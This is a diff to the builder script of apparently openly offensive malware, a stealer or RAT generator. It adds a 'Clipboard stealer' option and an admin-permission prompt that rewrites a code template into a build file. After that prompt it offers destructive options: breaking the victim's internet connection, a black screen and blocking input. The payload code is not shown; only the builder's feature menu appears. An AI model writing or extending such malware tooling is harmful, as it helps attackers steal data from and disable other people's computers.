@@ -92,6 +92,7 @@ ask("Screenshoot", "ss")
 ask("Startup", "startup")
 ask("Connection info", "con_info")
 ask("PC info", "pc_info")
+ask("Clipboard stealer", "steal_clipboard")
 c = ask("File downloader", "down_file")
 if c == "y":
     url = input(f"{red}[{res}URL{red}]{lred} > ")
@@ -126,7 +127,21 @@ if c == "y":
 def ask_othr():
     c = input(f"{lred}Do you want to continue to pc damaging/dangarous options? {red}ADMIN IS NEEDED {black}(y/n){lred} > ")
     if c == "y":
-        ask("Breake internet connection", "fuck_internet")
+        c = input(f"{lred}In order to continue the person running will be asked for admin perms contunue? {black}(y/n){lred} > ")
+        with open("resources/code.py", "r") as f:
+            content = f.read()
+            new_content = content.replace("admin_ask = ''", f"admin_ask = True")
+        with open("resources/build.py", "w") as f:
+            f.write(new_content)
+        if c == "y":
+            ask("Breake internet connection", "fuck_internet")
+            ask("Black screen", "black_screen")
+            ask("Block input", "fuck_input")
+        elif c == "n":
+            pass
+        else:
+            print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")
+
     elif c == "n":
         pass
     else:
